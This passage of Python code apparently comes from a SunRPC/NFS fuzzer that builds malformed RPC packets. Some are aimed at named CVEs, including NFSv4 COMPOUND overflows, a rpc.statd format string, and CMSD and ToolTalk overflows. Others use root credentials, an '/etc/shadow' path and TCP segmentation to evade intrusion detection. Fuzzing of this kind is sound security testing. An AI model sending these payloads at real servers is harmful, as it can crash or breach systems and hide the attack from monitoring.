        "many_ops", "ace_count_overflow", "utf8string_huge",
        "zero_ops", "single_invalid_op", "nested_compound",
    ])
    xid = _rand_xid()
    cred = _auth_sys(machinename=b"nfsclient", uid=0, gid=0)

    # NFS4 COMPOUND: tag (string) + minorversion (uint) + argarray (array of ops)
    tag = _xdr_string(b"fuzz")
    minor_version = _xdr_uint(1)  # NFSv4.1

    if variant == "many_ops":
        # CVE-2022-30136: >18 ops to overflow response buffer
        op_count = random.choice([19, 25, 50, 100, 255])
        ops = b""
        for _ in range(op_count):
            # OP_PUTROOTFH = 24, simple no-arg operation
            ops += _xdr_uint(24)
        args = tag + minor_version + _xdr_uint(op_count) + ops
        call = _rpc_call(xid, _PROG_NFS, 4, _NFS4_COMPOUND,
                         cred=cred, args=args)
        return call, 2049

    elif variant == "ace_count_overflow":
        # CVE-2022-34715: ACE_Count > 0x8000000
        # Embed in OP_SETATTR (opcode 34) with fattr4 including ACL
        ops = _xdr_uint(34)  # OP_SETATTR
        # Simplified: stateid + attrmask + ACL attr data
        stateid = b"\x00" * 16  # dummy stateid
        ops += stateid
        # attrmask bitmap: bit 12 = ACL
        ops += _xdr_uint(1) + _xdr_uint(0x00001000)
        # ACL value: ACE_Count
        ace_count = random.choice([0x08000001, 0x10000000, 0xFFFFFFFF])
        ops += _xdr_uint(ace_count)
        ops += os.urandom(64)  # fake ACE data
        args = tag + minor_version + _xdr_uint(1) + ops
        call = _rpc_call(xid, _PROG_NFS, 4, _NFS4_COMPOUND,
                         cred=cred, args=args)
        return call, 2049

    elif variant == "utf8string_huge":
        # CVE-2023-24941: utf8string with length > 0x1000
        str_len = random.choice([0x1001, 0x2000, 0x10000, 0x7FFFFFFF])
        # OP_LOOKUP (opcode 15) takes a utf8string component name
        ops = _xdr_uint(15)  # OP_LOOKUP
        ops += struct.pack("!I", str_len) + os.urandom(min(str_len, 256))
        args = tag + minor_version + _xdr_uint(1) + ops
        call = _rpc_call(xid, _PROG_NFS, 4, _NFS4_COMPOUND,
                         cred=cred, args=args)
        return call, 2049

    elif variant == "zero_ops":
        args = tag + minor_version + _xdr_uint(0)
        call = _rpc_call(xid, _PROG_NFS, 4, _NFS4_COMPOUND,
                         cred=cred, args=args)
        return call, 2049

    elif variant == "single_invalid_op":
        invalid_op = random.choice([0, 0xFFFFFFFF, 9999, 0x80000000])
        ops = _xdr_uint(invalid_op) + os.urandom(32)
        args = tag + minor_version + _xdr_uint(1) + ops
        call = _rpc_call(xid, _PROG_NFS, 4, _NFS4_COMPOUND,
                         cred=cred, args=args)
        return call, 2049

    else:  # nested_compound
        # Inner compound as args of outer compound
        inner_tag = _xdr_string(b"inner")
        inner_ops = _xdr_uint(24) * 5  # 5x PUTROOTFH
        inner_args = inner_tag + _xdr_uint(0) + _xdr_uint(5) + inner_ops
        # Outer compound with OP_ILLEGAL wrapping inner
        ops = _xdr_uint(10044) + inner_args  # fake opcode
        args = tag + minor_version + _xdr_uint(1) + ops
        call = _rpc_call(xid, _PROG_NFS, 4, _NFS4_COMPOUND,
                         cred=cred, args=args)
        return call, 2049


def _build_program_version_mismatch():
    """Strategy 9: Program/version mismatch to exercise error paths.

    Targets PROG_MISMATCH and PROC_UNAVAIL reply generation.
    Variants:
    - version_zero: request version 0
    - version_huge: request version 0xFFFFFFFF
    - nonexistent_program: program number nobody serves
    - wrong_version: correct program, wrong version
    - version_overflow_pair: trigger mismatch_info low/high overflow
    """
    variant = random.choice([
        "version_zero", "version_huge", "nonexistent_program",
        "wrong_version", "version_overflow_pair",
    ])
    xid = _rand_xid()

    if variant == "version_zero":
        call = _rpc_call(xid, _PROG_PORTMAPPER, 0, _PMAP_NULL,
                         cred=_auth_none())
        return call, 111

    elif variant == "version_huge":
        call = _rpc_call(xid, _PROG_PORTMAPPER, 0xFFFFFFFF, _PMAP_NULL,
                         cred=_auth_none())
        return call, 111

    elif variant == "nonexistent_program":
        prog = random.randint(200000, 299999)
        call = _rpc_call(xid, prog, 1, 0, cred=_auth_none())
        return call, 111

    elif variant == "wrong_version":
        # NFS version 99
        call = _rpc_call(xid, _PROG_NFS, 99, 0, cred=_auth_none())
        return call, 2049

    else:  # version_overflow_pair
        call = _rpc_call(xid, _PROG_PORTMAPPER, 0x80000000, _PMAP_NULL,
                         cred=_auth_none())
        return call, 111


def _build_xdr_padding_violation():
    """Strategy 10: XDR padding violations.

    Targets xdr_opaque/xdr_string padding handling.
    Variants:
    - nonzero_padding: padding bytes are 0xFF instead of 0x00
    - missing_padding: string not padded to 4-byte boundary
    - extra_padding: more padding than needed
    - truncated_at_padding: message ends where padding should be
    - garbage_after_message: extra bytes after valid XDR message
    """
    variant = random.choice([
        "nonzero_padding", "missing_padding", "extra_padding",
        "truncated_at_padding", "garbage_after_message",
    ])
    xid = _rand_xid()

    if variant == "nonzero_padding":
        # String "abc" (3 bytes) should have 1 byte 0x00 padding
        # We use 0xFF instead
        bad_str = struct.pack("!I", 3) + b"abc" + b"\xFF"
        args = bad_str
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_GETPORT,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "missing_padding":
        # String "ab" (2 bytes) needs 2 bytes padding — we skip it
        bad_str = struct.pack("!I", 2) + b"ab"  # no padding
        args = bad_str + _xdr_uint(0)
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_GETPORT,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "extra_padding":
        # String "a" (1 byte) gets 7 bytes padding instead of 3
        bad_str = struct.pack("!I", 1) + b"a" + b"\x00" * 7
        args = bad_str
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_GETPORT,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "truncated_at_padding":
        # String "hello" (5 bytes) needs 3 bytes padding — message ends
        # right after the data, missing padding
        bad_str = struct.pack("!I", 5) + b"hello"
        msg = _xdr_uint(xid) + _xdr_uint(_MSG_CALL)
        msg += _xdr_uint(_RPC_VERSION) + _xdr_uint(_PROG_PORTMAPPER)
        msg += _xdr_uint(2) + _xdr_uint(_PMAP_GETPORT)
        msg += _auth_none() + _auth_none()
        msg += bad_str  # no padding, message ends
        return msg, 111

    else:  # garbage_after_message
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=_auth_none())
        garbage = os.urandom(random.randint(1, 200))
        return call + garbage, 111


def _build_tcp_segmentation_evasion(payload_override=None):
    """Strategy 11: TCP segmentation evasion.

    Targets IDS rule matching by splitting content at critical offsets.
    Variants:
    - split_rm_header: split 4-byte RM header across TCP boundaries
    - split_rpc_header: split at xid/mtype/rpcvers boundary
    - split_at_auth: split between credential and verifier
    - split_at_args: split between auth and procedure arguments
    - interleaved_records: mix of tiny and normal records
    - slow_byte_drip: 1 byte at a time
    """
    if payload_override is not None:
        xid = _rand_xid()
        call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_NULL,
                         cred=_auth_none()) + payload_override
        return _rm_frame(call), 111
    variant = random.choice([
        "split_rm_header", "split_rpc_header", "split_at_auth",
        "split_at_args", "interleaved_records", "slow_byte_drip",
    ])
    xid = _rand_xid()
    base_call = _rpc_call(xid, _PROG_PORTMAPPER, 2, _PMAP_DUMP,
                          cred=_auth_sys(uid=0, gid=0))
    framed = _rm_frame(base_call)

    if variant == "split_rm_header":
        # Split after 2 bytes of RM header
        return framed, 111  # caller splits at offset 2

    elif variant == "split_rpc_header":
        # Split after xid (first 4 bytes of RPC msg, offset 8 in framed)
        return framed, 111

    elif variant == "split_at_auth":
        # Split at the credential boundary (after proc number)
        # xid(4) + mtype(4) + rpcvers(4) + prog(4) + vers(4) + proc(4) = 24
        # + RM header(4) = 28
        return framed, 111

    elif variant == "split_at_args":
        return framed, 111

    elif variant == "interleaved_records":
        payload = b""
        # Mix tiny NULLs with a real portmap DUMP
        for _ in range(5):
            null_call = _rpc_call(_rand_xid(), _PROG_PORTMAPPER, 2, _PMAP_NULL,
                                  cred=_auth_none())
            payload += _rm_frame(null_call)
        payload += _rm_frame(base_call)
        for _ in range(5):
            null_call = _rpc_call(_rand_xid(), _PROG_PORTMAPPER, 2, _PMAP_NULL,
                                  cred=_auth_none())
            payload += _rm_frame(null_call)
        return payload, 111

    else:  # slow_byte_drip
        # Each byte is its own RM fragment (extreme fragmentation)
        payload = b""
        for i, byte_val in enumerate(base_call):
            is_last = (i == len(base_call) - 1)
            if isinstance(byte_val, int):
                payload += _rm_frame(bytes([byte_val]), last=is_last)
            else:
                payload += _rm_frame(byte_val, last=is_last)
        return payload, 111


def _build_reply_fuzzing():
    """Strategy 12: Malformed RPC reply messages (client-side parser testing).

    Variants:
    - invalid_accept_stat: accept_stat value out of range
    - prog_mismatch_overflow: mismatch_info with huge version numbers
    - garbage_args_reply: GARBAGE_ARGS with extra data
    - system_err_data: SYSTEM_ERR with unexpected trailing data
    - denied_auth_error: AUTH_ERROR with invalid auth_stat
    - truncated_reply: reply truncated mid-field
    """
    variant = random.choice([
        "invalid_accept_stat", "prog_mismatch_overflow",
        "garbage_args_reply", "system_err_data", "denied_auth_error",
        "truncated_reply",
    ])
    xid = _rand_xid()

    if variant == "invalid_accept_stat":
        stat = random.choice([6, 100, 0xFFFFFFFF, 0x80000000])
        reply = _rpc_reply_accepted(xid, stat)
        return reply, 111

    elif variant == "prog_mismatch_overflow":
        # PROG_MISMATCH reply has mismatch_info: { low, high }
        data = _xdr_uint(0xFFFFFFFF) + _xdr_uint(0)  # low > high
        reply = _rpc_reply_accepted(xid, _ACCEPT_PROG_MISMATCH, data=data)
        return reply, 111

    elif variant == "garbage_args_reply":
        extra = os.urandom(random.randint(50, 500))
        reply = _rpc_reply_accepted(xid, _ACCEPT_GARBAGE_ARGS, data=extra)
        return reply, 111

    elif variant == "system_err_data":
        extra = os.urandom(random.randint(1, 200))
        reply = _rpc_reply_accepted(xid, _ACCEPT_SYSTEM_ERR, data=extra)
        return reply, 111

    elif variant == "denied_auth_error":
        auth_stat = random.choice([99, 0xFFFFFFFF, 15, 0x80000000])
        data = _xdr_uint(auth_stat)
        reply = _rpc_reply_denied(xid, _REJECT_AUTH_ERROR, data=data)
        return reply, 111

    else:  # truncated_reply
        reply = _rpc_reply_accepted(xid, _ACCEPT_SUCCESS,
                                     data=os.urandom(100))
        cut = random.randint(4, len(reply) - 4)
        return reply[:cut], 111


def _build_null_procedure_abuse():
    """Strategy 13: NULL procedure (proc=0) abuse.

    NULL proc should always succeed with no auth — test edge cases.
    Variants:
    - null_with_args: NULL proc with unexpected arguments
    - null_root_auth: NULL proc with AUTH_SYS uid=0
    - null_rapid_fire: many NULL calls concatenated
    - null_to_nonexistent: NULL proc to nonexistent program
    - null_with_oversized_verf: NULL with huge verifier
    """
    variant = random.choice([
        "null_with_args", "null_root_auth", "null_rapid_fire",
        "null_to_nonexistent", "null_with_oversized_verf",
    ])

    if variant == "null_with_args":
        args = os.urandom(random.randint(100, 4000))
        call = _rpc_call(_rand_xid(), _PROG_PORTMAPPER, 2, 0,
                         cred=_auth_none(), args=args)
        return call, 111

    elif variant == "null_root_auth":
        cred = _auth_sys(machinename=b"root-null", uid=0, gid=0)
        call = _rpc_call(_rand_xid(), _PROG_NFS, 4, 0, cred=cred)
        return call, 2049

    elif variant == "null_rapid_fire":
        payload = b""
        for _ in range(random.randint(100, 500)):
            call = _rpc_call(_rand_xid(), _PROG_PORTMAPPER, 2, 0,
                             cred=_auth_none())
            payload += call
        return _clamp(payload), 111

    elif variant == "null_to_nonexistent":
        prog = random.randint(200000, 999999)
        call = _rpc_call(_rand_xid(), prog, 1, 0, cred=_auth_none())
        return call, 111

    else:  # null_with_oversized_verf
        verf = _xdr_uint(_AUTH_NONE) + _xdr_opaque_var(os.urandom(400))
        call = _rpc_call(_rand_xid(), _PROG_PORTMAPPER, 2, 0,
                         cred=_auth_none(), verf=verf)
        return call, 111


def _build_rpc_service_daemon_fuzz():
    """Strategy 14: RPC service daemon-specific attacks.

    Targets specific RPC services with known vulnerability patterns.
    Variants:
    - statd_format_string: rpc.statd mon_name format string (CVE-2000-0666)
    - cmsd_buffer_overflow: CMSD CREATE/INSERT overflow (CVE-2002-0391)
    - sadmind_auth_bypass: sadmind with weak AUTH_SYS (CVE-1999-0977)
    - mountd_export_fuzz: mountd export/unmount with bad paths
    - tooltalk_overflow: ToolTalk DB overflow (CVE-2002-0679)
    - yppasswd_overflow: yppasswd username/password overflow
    - nlockmgr_fuzz: NLM lock manager with malformed lock requests
    """
    variant = random.choice([
        "statd_format_string", "cmsd_buffer_overflow", "sadmind_auth_bypass",
        "mountd_export_fuzz", "tooltalk_overflow", "yppasswd_overflow",
        "nlockmgr_fuzz",
    ])
    xid = _rand_xid()
    cred = _auth_sys(machinename=b"attacker", uid=0, gid=0)

    if variant == "statd_format_string":
        # CVE-2000-0666: format string in mon_name field
        # SM_MON procedure (proc=2 on statd program 100024 v1)
        fmt_str = random.choice([
            b"%n%n%n%n%n%n%n%n",
            b"%08x." * 50,
            b"AAAA" + b"%x" * 100,
            b"%s%s%s%s%s%s%s%s",
        ])
        # SM_MON args: mon_name (string) + my_id { my_name, my_prog, my_vers, my_proc }
        args = _xdr_string(fmt_str)
        args += _xdr_string(b"localhost")  # my_name
        args += _xdr_uint(_PROG_STATD) + _xdr_uint(1) + _xdr_uint(0)
        args += os.urandom(16)  # priv data
        call = _rpc_call(xid, _PROG_STATD, 1, 2, cred=cred, args=args)
        return call, 111

    elif variant == "cmsd_buffer_overflow":
        # CVE-2002-0391: buffer overflow in CMSD_CREATE (proc 10)
        long_str = os.urandom(random.choice([1024, 4096, 8192]))
        args = _xdr_string(long_str)  # oversized calendar name
        args += _xdr_uint(0)  # access rights
        call = _rpc_call(xid, _PROG_CMSD, 5, 10, cred=cred, args=args)
        return call, 111

    elif variant == "sadmind_auth_bypass":
        # CVE-1999-0977: sadmind with AUTH_SYS root credentials
        # NETMGT_PROC_SERVICE = 1
        args = _xdr_string(b"system")  # domain
        args += _xdr_string(b"root")  # client name
        args += _xdr_uint(0)  # various fields
        args += os.urandom(random.randint(32, 256))
        call = _rpc_call(xid, _PROG_SADMIND, 10, 1, cred=cred, args=args)
        return call, 111

    elif variant == "mountd_export_fuzz":
        # mountd v3: MNT (proc=1), UMNT (proc=3), UMNTALL (proc=4)
        proc = random.choice([1, 3, 4, 5])
        path = random.choice([
            b"/" * 4096,
            b"/../" * 500,
            b"/etc/shadow\x00/tmp",
            b"\x00" * 100,
            os.urandom(random.randint(100, 2000)),
        ])
        args = _xdr_string(path)
        call = _rpc_call(xid, _PROG_MOUNTD, 3, proc, cred=cred, args=args)
        return call, 111

    elif variant == "tooltalk_overflow":
        # CVE-2002-0679: ToolTalk DB server (100083)
        # _Tt_db_server_create_file (proc=7)
        long_path = b"/tmp/" + os.urandom(random.choice([1024, 4096]))
        args = _xdr_string(long_path)
        call = _rpc_call(xid, _PROG_TTDBSERV, 1, 7, cred=cred, args=args)
        return call, 111

    elif variant == "yppasswd_overflow":
        # yppasswd (program 100009, v1, proc 1)
        # Oversized old/new password or username
        field = random.choice(["username", "old_password", "new_password"])
        overflow_data = os.urandom(random.choice([256, 1024, 4096]))
        if field == "username":
            args = _xdr_string(overflow_data)
            args += _xdr_string(b"oldpass") + _xdr_string(b"newpass")
        elif field == "old_password":
            args = _xdr_string(b"user")
            args += _xdr_string(overflow_data) + _xdr_string(b"newpass")
        else:
            args = _xdr_string(b"user")
            args += _xdr_string(b"oldpass") + _xdr_string(overflow_data)
        call = _rpc_call(xid, 100009, 1, 1, cred=cred, args=args)
        return call, 111

    else:  # nlockmgr_fuzz
        # NLM (100021) v4: NLM4_LOCK (proc=2), NLM4_UNLOCK (proc=4)
        proc = random.choice([2, 4, 7, 12])  # LOCK, UNLOCK, SHARE, FREE_ALL
        # Simplified NLM lock args
        args = _xdr_string(b"lock-" + os.urandom(8))  # cookie
        args += _xdr_uint(random.choice([0, 1]))  # block
        args += _xdr_uint(random.choice([0, 1]))  # exclusive
        # nlm4_lock: { caller_name, fh, oh, svid, l_offset, l_len }
        args += _xdr_string(b"fuzzer")
        args += _xdr_opaque_var(os.urandom(32))  # file handle
        args += _xdr_opaque_var(os.urandom(8))   # owner handle
        args += _xdr_uint(random.randint(0, 0xFFFFFFFF))  # svid
        # 64-bit offset and length
        args += _xdr_uint(0) + _xdr_uint(random.choice([0, 0xFFFFFFFF]))
        args += _xdr_uint(0) + _xdr_uint(random.choice([0, 0xFFFFFFFF]))
        call = _rpc_call(xid, _PROG_NLM, 4, proc, cred=cred, args=args)
        return call, 111


# ── Dispatcher ──────────────────────────────────────────────────────────────
_BUILDERS = {
    "xdr_string_overflow":        _build_xdr_string_overflow,
    "xdr_array_overflow":         _build_xdr_array_overflow,
    "record_marking_abuse":       _build_record_marking_abuse,
    "rpc_header_manipulation":    _build_rpc_header_manipulation,
    "auth_sys_overflow":          _build_auth_sys_overflow,
    "auth_flavor_confusion":      _build_auth_flavor_confusion,
    "portmap_abuse":              _build_portmap_abuse,
    "nfs_compound_overflow":      _build_nfs_compound_overflow,
    "program_version_mismatch":   _build_program_version_mismatch,
    "xdr_padding_violation":      _build_xdr_padding_violation,
    "tcp_segmentation_evasion":   _build_tcp_segmentation_evasion,
    "reply_fuzzing":              _build_reply_fuzzing,
    "null_procedure_abuse":       _build_null_procedure_abuse,
    "rpc_service_daemon_fuzz":    _build_rpc_service_daemon_fuzz,
}


_SUNRPC_OVERRIDE_CAPABLE = frozenset(["record_marking_abuse", "tcp_segmentation_evasion"])

def build_sunrpc_payload(strategy: str, payload_override=None):
    """Return (payload_bytes, dst_port) for the given strategy."""
    builder = _BUILDERS.get(strategy)
    if builder is None:
        builder = _build_xdr_string_overflow
    if payload_override is not None and strategy in _SUNRPC_OVERRIDE_CAPABLE:
        payload, dst_port = builder(payload_override=payload_override)
    else:
        payload, dst_port = builder()
    return _clamp(payload), dst_port


# ── Mutator class ──────────────────────────────────────────────────────────
class SunrpcMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = SUNRPC_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return SUNRPC_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_sunrpc_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
